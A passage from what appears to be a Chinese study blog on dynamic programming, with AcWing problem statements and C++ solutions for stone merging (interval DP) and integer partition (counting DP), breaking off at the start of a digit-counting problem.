encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 堆石子排成一排，其编号为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>，</mtext><mn>2</mn><mtext>，</mtext><mn>3</mn><mtext>，</mtext><mo>…</mo><mtext>，</mtext><mi>N</mi></mrow><annotation encoding="application/x-tex">1，2，3，…，N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mord">3</span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p>每堆石子有一定的质量，可以用一个整数来描述，现在要将这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 堆石子合并成为一堆。</p><p>每次只能合并相邻的两堆，合并的代价为这两堆石子的质量之和，合并后与这两堆石子相邻的石子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同。</p><p>例如有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span> 堆石子分别为 <code>1 3 5 2</code>， 我们可以先合并 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>、</mtext><mn>2</mn></mrow><annotation encoding="application/x-tex">1、2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">、</span><span class="mord">2</span></span></span></span> 堆，代价为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn></mrow><annotation encoding="application/x-tex">4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>，得到 <code>4 5 2</code>， 又合并 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mtext>，</mtext><mn>2</mn></mrow><annotation encoding="application/x-tex">1，2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">2</span></span></span></span> 堆，代价为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>9</mn></mrow><annotation encoding="application/x-tex">9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">9</span></span></span></span>，得到 <code>9 2</code> ，再合并得到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>，总代价为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>+</mo><mn>9</mn><mo>+</mo><mn>11</mn><mo>=</mo><mn>24</mn></mrow><annotation encoding="application/x-tex">4+9+11=24</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">9</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">24</span></span></span></span>；</p><p>如果第二步是先合并 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mtext>，</mtext><mn>3</mn></mrow><annotation encoding="application/x-tex">2，3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">2</span><span class="mord cjk_fallback">，</span><span class="mord">3</span></span></span></span> 堆，则代价为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>7</mn></mrow><annotation encoding="application/x-tex">7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span>，得到 <code>4 7</code>，最后一次合并代价为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>11</mn></mrow><annotation encoding="application/x-tex">11</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span></span></span></span>，总代价为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>+</mo><mn>7</mn><mo>+</mo><mn>11</mn><mo>=</mo><mn>22</mn></mrow><annotation encoding="application/x-tex">4+7+11=22</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">11</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">22</span></span></span></span>。</p><p>问题是：找出一种合理的方法，使总的代价最小，输出最小代价。</p><p><strong>输入格式</strong></p><p>第一行一个数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 表示石子的堆数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>。</p><p>第二行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> 个数，表示每堆石子的质量(均不超过 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1000</mn></mrow><annotation encoding="application/x-tex">1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span>)。</p><p><strong>输出格式</strong></p><p>输出一个整数，表示最小代价。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>300</mn></mrow><annotation encoding="application/x-tex">1 \le N \le 300</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">300</span></span></span></span></p><p><strong>输入样例：</strong></p><pre><code>41 3 5 2</code></pre><p><strong>输出样例：</strong></p><pre><code>22</code></pre><h3 id="区间DP-2">区间DP</h3><p>区间DP：定义状态时定义的是一个空间。</p><ul><li><p>状态表示<code>f[i][j]</code></p><ul><li>集合：所有将<code>第i堆石子</code>到<code>第j堆石子</code>合并成一堆石子的合并方式。</li><li>属性：Min</li></ul></li><li><p>状态计算</p><ul><li><p>以最后一次分界线的位置来分类</p></li><li><p>分界线k可以确定<code>[i，k]</code>和<code>[k+1，r]</code>两个区间<br><code>f[i][j] = min(f[i][k] + f[k+1][j] + s[k] - s[i-1]), k=i~j-1</code></p><p><strong>注意：右边界的起点是<code>k+1</code></strong></p></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">310</span>;</span><br><span class="line"><span class="type">int</span> n, s[kN];z</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;s[i]);</span><br><span class="line">    s[i] += s[i - <span class="number">1</span>];  <span class="comment">// 前缀和</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 考虑如何使得在计算后面的状态时, 前面的状态已被计算: 外循环枚举len</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> len = <span class="number">2</span>; len &lt;= n; len++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i + len - <span class="number">1</span> &lt;= n; i++) &#123;</span><br><span class="line">      <span class="type">int</span> l = i, r = i + len - <span class="number">1</span>;</span><br><span class="line">      f[l][r] = <span class="number">2e9</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> k = l; k &lt; r; k++) &#123;  <span class="comment">// k枚举左半部分最后一个石子的位置</span></span><br><span class="line">        f[l][r] = <span class="built_in">min</span>(f[l][r], f[l][k] + f[k + <span class="number">1</span>][r] + s[r] - s[l - <span class="number">1</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[<span class="number">1</span>][n]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="计数类DP">计数类DP</h1><h2 id="AcWing-900-整数划分"><a href="https://www.acwing.com/problem/content/902/">AcWing 900. 整数划分</a></h2><p>一个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 可以表示成若干个正整数之和，形如：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>n</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>+</mo><mi>n</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo>+</mo><mo>…</mo><mo>+</mo><mi>n</mi><mi mathvariant="normal">_</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">n = n\_1 + n\_2 + … + n\_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo>≥</mo><mi>n</mi><mi mathvariant="normal">_</mi><mn>2</mn><mo>≥</mo><mo>…</mo><mo>≥</mo><mi>n</mi><mi mathvariant="normal">_</mi><mi>k</mi><mo separator="true">,</mo><mi>k</mi><mo>≥</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n\_1 \ge n\_2 \ge … \ge n\_k, k \ge 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9544em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord">_2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"></span><span class="mord mathnormal">n</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p><p>我们将这样的一种表示称为正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的一种划分。</p><p>现在给定一个正整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，请你求出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 共有多少种不同的划分方法。</p><p><strong>输入格式</strong></p><p>共一行，包含一个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>。</p><p><strong>输出格式</strong></p><p>共一行，包含一个整数，表示总划分数量。</p><p>由于答案可能很大，输出结果请对 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mo>+</mo><mn>7</mn></mrow><annotation encoding="application/x-tex">10^9 + 7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">7</span></span></span></span> 取模。</p><p><strong>数据范围</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>≤</mo><mi>n</mi><mo>≤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>输入样例:</strong></p><pre><code>5</code></pre><p><strong>输出样例：</strong></p><pre><code>7</code></pre><h3 id="算法1-完全背包解法-推荐">算法1 完全背包解法(推荐)</h3><p>转化为完全背包问题：从1 ~ n 这些数去选，可以选任意多个，使得总和恰好为n</p><ul><li><p>状态表示<code>f[i][j]</code></p><ul><li>集合 只从1～i 中选，总和恰好等于j的方案</li><li>属性 Num</li></ul></li><li><p>状态计算 <code>f[i][j] = f[i - 1][j] + f[i][j - i]</code></p><ul><li><p>按照i选几个进行划分</p></li><li><p>选择k个i <code>f[i - 1][j - k*i]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">因为</span><br><span class="line">f[i][j] = f[i-1][j] + f[i-1][j-i] + f[i-1][j-2i] +...+ f[i-1][j-si]</span><br><span class="line">f[i][j-i] =           f[i-1][j-i] + f[i-1][j-2i] +...+ f[i-1][j-si]</span><br><span class="line">所以</span><br><span class="line">f[i][j] = f[i - 1][j] + f[i][j - i]</span><br><span class="line">一维优化</span><br><span class="line">f[j] = f[j] + f[j - i], j从小到大循环</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>, kMOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  f[<span class="number">0</span>] = <span class="number">1</span>;  <span class="comment">// 初始化,选择0个数使得体积为0有1种情况</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt;= n; j++) &#123;</span><br><span class="line">      f[j] = (f[j] + f[j - i]) % kMOD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="算法2">算法2</h3><ul><li>状态表示<code>f[i][j]</code><ul><li>集合：<strong>总和为 i , 总个数为 j</strong> 的方案</li><li>属性：Num</li></ul></li><li>状态计算<ul><li>按划分结果中<strong>最小值是否为1</strong>进行分类</li><li>最小值为1 <code>f[i - 1][j - 1]</code></li><li>最小值非1 <code>f[i - j][j]</code>, 即这j个划分中每一部分都可以提取出一个1出来</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>, kMOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">int</span> n, f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  f[<span class="number">1</span>][<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= i; j++) &#123;</span><br><span class="line">      f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - <span class="number">1</span>] + f[i - j][j]) % kMOD;  <span class="comment">// 取模</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    res = (res + f[n][i]) % kMOD;  <span class="comment">// 结果是 各自划分个数 的方案数之和</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, res);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="数位统计DP">数位统计DP</h1><h2 id="AcWing-338-计数问题"><a href="https://www.acwing.com/problem/content/340/">AcWing 338. 计数问题</a></h2><p>给定两个整数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span>，求 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span> 之间的所有数字中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>∼</mo><mn>9</mn></mrow><annotation encoding="application/x-tex">0 \sim 9</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">9</span></span></span></span> 的出现次数。</p><p>例如，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>=</mo><mn>1024</mn><mtext>，</mtext><mi>b</mi><mo>=</mo><mn>1032</mn></mrow><annotation encoding="application/x-tex">a=1024，b=1032</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">1024</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">b</span><span class="mspace" 